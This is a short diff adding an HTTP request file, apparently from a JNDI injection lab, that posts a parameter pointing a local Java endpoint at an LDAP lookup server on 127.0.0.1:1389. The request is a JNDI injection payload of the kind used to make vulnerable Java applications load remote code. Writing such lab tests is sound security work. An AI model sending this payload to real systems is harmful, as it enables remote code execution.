@@ -1,0 +1,8 @@
+###
+# case1 lookup
+POST /jndi/case1 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: application/x-www-form-urlencoded
+
+url=ldap://127.0.0.1:1389/0mghfs
+
